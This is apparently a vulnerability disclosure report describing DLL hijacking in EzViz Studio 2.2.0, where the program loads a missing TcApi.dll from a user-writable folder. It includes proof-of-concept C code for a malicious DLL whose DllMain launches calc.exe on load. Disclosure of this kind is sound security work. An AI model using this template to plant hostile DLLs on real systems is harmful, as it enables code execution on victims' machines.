### DLL Hijacking via EzViz Studio (Reported by EAFZ from Pythongoras) 
 
### 1.Test Environment: 
- OS: Windows 11 Pro 64 bit(10.0,  Build 2261) 
- EzViz Studio version: 2.2.0 
### 2.Technical Description  
1. Technical Description
<img src="https://github.com/myantti3m/eafz1/blob/main/1.jpg">

EzvizStudio.exe searches for a DLL called TcApi.dll after we ran the EzvizStudio.exe  Because TcApi.dll doesn’t exist in any of the paths of the DLL search order we outlined above, we can plant it inside the current working directory and wait until the application will load the “malicious” TcApi.dll . Especially with 2 paths “ 
C:\Users\wirkh\AppData\Local\Microsoft\WindowsApps\TcApi.dll”, Technical Description  
<img src="https://github.com/myantti3m/eafz1/blob/main/2.jpg">
In the figure above, EzvizStudio.exe searches for a DLL called TcApi.dll after we ran the EzvizStudio.exe 
Because TcApi.dll doesn’t exist in any of the paths of the DLL search order we outlined above, we can plant it inside the current working directory and wait until the application will load the “malicious” TcApi.dll . Especially with paths “ 
C:\Users\wirkh\AppData\Local\Microsoft\WindowsApps\TcApi.dll”,  normal users default to write permission to this dir. 
### 3.POC 
We created a malicious DLL file (TcApi.dll) and complied it. In our case, it opens calc.exe. You can see the code below: 
```
#include <windows.h> 
#pragma comment (lib, "user32.lib") 
#include "pch.h" 
#include <iostream> 
#include <stdlib.h> 
BOOL APIENTRY DllMain(HMODULE hModule, 
 	DWORD nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:  system("calc.exe"); break;
  case DLL_PROCESS_DETACH:  break;
  case DLL_THREAD_ATTACH:   break;
  case DLL_THREAD_DETACH:   break; 
 	} 
 	return TRUE; 
}  
```
  
 
If we run the EzVizStudio again, the code from the “malicious” DLL runs: 
  
 <img src="https://github.com/myantti3m/eafz1/blob/main/3.jpg">
 
 <img src="https://github.com/myantti3m/eafz1/blob/main/4.png">
